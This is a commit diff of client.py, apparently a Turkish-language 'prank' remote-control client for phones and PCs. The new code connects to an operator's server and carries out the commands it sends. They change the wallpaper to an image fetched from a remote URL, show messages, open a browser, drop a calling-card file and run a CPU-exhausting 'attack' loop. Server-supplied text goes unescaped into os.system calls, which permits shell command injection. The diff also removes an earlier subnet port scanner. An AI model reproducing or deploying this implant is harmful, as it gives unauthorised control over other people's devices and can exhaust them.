ecaa22c0c30f677de9779d716f3ac3848a56b94f
RobotAdam899 <anonbot918@gmail.com>
2025-07-14 04:45:58 +0300

    Update client.py
    Signed-off-by: RobotAdam899 <anonbot918@gmail.com>

--- client.py
+++ client.py
@@ -1,45 +1,97 @@
 import socket
+import platform
+import os
+import urllib.request
+import ctypes
 
-def ip_tara(modem_ip):
-    aktifler = []
-    ip_parca = ".".join(modem_ip.split(".")[:-1])
-    for i in range(1, 255):
-        ip = f"{ip_parca}.{i}"
-        try:
-            s = socket.socket()
-            s.settimeout(0.2)
-            s.connect((ip, PORT))
-            aktifler.append(ip)
-            s.close()
-        except:
-            pass
-    return aktifler
+def cihaz_tipi():
+    sistem = platform.system()
+    if sistem == "Linux":
+        if "Android" in platform.platform():
+            return "Telefon"
+        else:
+            return "Linux PC"
+    elif sistem == "Windows":
+        return "Windows PC"
+    elif sistem == "Darwin":
+        return "Mac"
+    return "Bilinmeyen"
 
+def arkaplan_degistir(url):
+    try:
+        urllib.request.urlretrieve(url, "arkaplan.jpg")
+        if cihaz == "Telefon":
+            os.system("termux-wallpaper -f arkaplan.jpg")
+        elif cihaz == "Windows PC":
+            yol = os.path.abspath("arkaplan.jpg")
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3)
+        elif cihaz == "Linux PC":
+            os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg")
+        s.send(b"[✓] Arka plan degistirildi\n")
+    except:
+        s.send(b"[!] Arka plan degistirilemedi\n")
+
+def saka_modu(mesaj):
+    if cihaz == "Telefon":
+        os.system(f'termux-notification --title "Şaka Modu" --content "{mesaj}"')
+    elif cihaz == "Windows PC":
+        os.system(f'msg * "{mesaj}"')
+    elif cihaz == "Linux PC":
+        os.system(f'notify-send "Şaka Modu" "{mesaj}"')
+    s.send(b"[!] Şaka modu mesajı gönderildi!\n")
+
+def google_ac():
+    if cihaz == "Telefon":
+        os.system("termux-open-url https://www.google.com")
+    elif cihaz == "Windows PC":
+        os.system("start https://www.google.com")
+    elif cihaz == "Linux PC":
+        os.system("xdg-open https://www.google.com")
+    s.send(b"[✓] Google acildi\n")
+
+def dosya_olustur():
+    with open("saka.txt", "w") as f:
+        f.write("T-Society buradaydı!")
+    s.send(b"[+] Dosya olusturuldu\n")
+
+def saldiri_yap():
+    for _ in range(9999999):
+        _ = 9 ** 999
+    s.send(b"[✓] Cihaz kasarildi\n")
+
+# === BAĞLANTI ===
+cihaz = cihaz_tipi()
+SERVER_IP = input("Server IP gir: ")
 PORT = int(input("Port gir: "))
-modem_ip = input("Modem IP gir (örn: 192.168.1.1): ")
 
-cihazlar = ip_tara(modem_ip)
-if not cihazlar:
-    print("[!] Aktif cihaz bulunamadi.")
+s = socket.socket()
+try:
+    s.connect((SERVER_IP, PORT))
+    s.send(f"[+] {cihaz} baglandi.".encode())
+except:
+    print("[!] Baglanti hatasi.")
     exit()
 
-print("[*] Aktif IP'ler:")
-for i, ip in enumerate(cihazlar):
-    print(f"[{i+1}] {ip}")
-
-sec = input("[>] Secilecek IP no (tumu icin *): ")
-hedefler = cihazlar if sec == "*" else [cihazlar[int(sec)-1]]
-
-for ip in hedefler:
+# === KOMUT DÖNGÜSÜ ===
+while True:
     try:
-        s = socket.socket()
-        s.connect((ip, PORT))
-        s.send("[✓] Baglanti kuruldu\n".encode())
-        while True:
-            komut = s.recv(1024).decode().strip()
-            if komut == "exit":
-                break
-            print(f"[{ip}] Komut alindi: {komut}")
-        s.close()
+        komut = s.recv(1024).decode().strip()
+        if komut == "google":
+            google_ac()
+        elif komut == "saldiri":
+            saldiri_yap()
+        elif komut == "dosya":
+            dosya_olustur()
+        elif komut.startswith("arkaplan "):
+            _, url = komut.split(" ", 1)
+            arkaplan_degistir(url)
+        elif komut.startswith("saka "):
+            _, mesaj = komut.split(" ", 1)
+            saka_modu(mesaj)
+        elif komut == "exit":
+            s.close()
+            break
+        else:
+            s.send(b"[!] Bilinmeyen komut\n")
     except:
-        print(f"[!] {ip} baglantisi basarisiz.")
+        break
